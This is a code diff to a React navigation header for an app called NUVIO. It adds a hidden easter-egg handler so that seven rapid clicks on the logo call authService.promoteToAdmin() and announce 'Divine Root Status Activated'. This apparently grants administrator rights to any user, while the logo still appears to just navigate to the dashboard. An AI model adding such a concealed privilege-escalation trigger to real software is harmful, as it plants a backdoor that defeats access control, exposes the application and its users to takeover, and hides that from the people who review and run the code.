@@ -3,11 +3,14 @@ import { Menu, Zap, MessageSquare, Bell, Search } from 'lucide-react';
 import { notificationService } from '../../services/notificationService';
 import NotificationPanel from './NotificationPanel';
 import { useNavigate } from 'react-router-dom';
+import { authService } from '../../services/authService';
 
 const UniversalHeader = ({ onMenuClick, user }) => {
   const [isNotifyOpen, setIsNotifyOpen] = useState(false);
   const [notifications, setNotifications] = useState([]);
   const [unreadCount, setUnreadCount] = useState(0);
+  const [logoClicks, setLogoClicks] = useState(0);
+  const [lastClickTime, setLastClickTime] = useState(0);
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -34,6 +37,23 @@ const UniversalHeader = ({ onMenuClick, user }) => {
     setUnreadCount(notificationService.getUnreadCount());
   };
 
+  const handleLogoClick = async () => {
+    const now = Date.now();
+    if (now - lastClickTime < 1000) {
+      const newClicks = logoClicks + 1;
+      setLogoClicks(newClicks);
+      if (newClicks >= 7) {
+        await authService.promoteToAdmin();
+        setLogoClicks(0);
+        notificationService.send("Authority Elevated", "Divine Root Status Activated.", "info");
+      }
+    } else {
+      setLogoClicks(1);
+    }
+    setLastClickTime(now);
+    navigate('/dashboard');
+  };
+
   return (
     <>
       <header className="sticky top-0 z-50 h-[60px] w-full bg-background-base/80 backdrop-blur-md border-b border-border px-4 flex items-center justify-between">
@@ -44,7 +64,7 @@ const UniversalHeader = ({ onMenuClick, user }) => {
           >
             <Menu className="w-6 h-6 text-text-primary" />
           </button>
-          <div className="flex items-center gap-1 cursor-pointer" onClick={() => navigate('/dashboard')}>
+          <div className="flex items-center gap-1 cursor-pointer select-none" onClick={handleLogoClick}>
             <span className="text-xl font-black nv-gradient-text tracking-tighter">⚡ NUVIO</span>
           </div>
         </div>
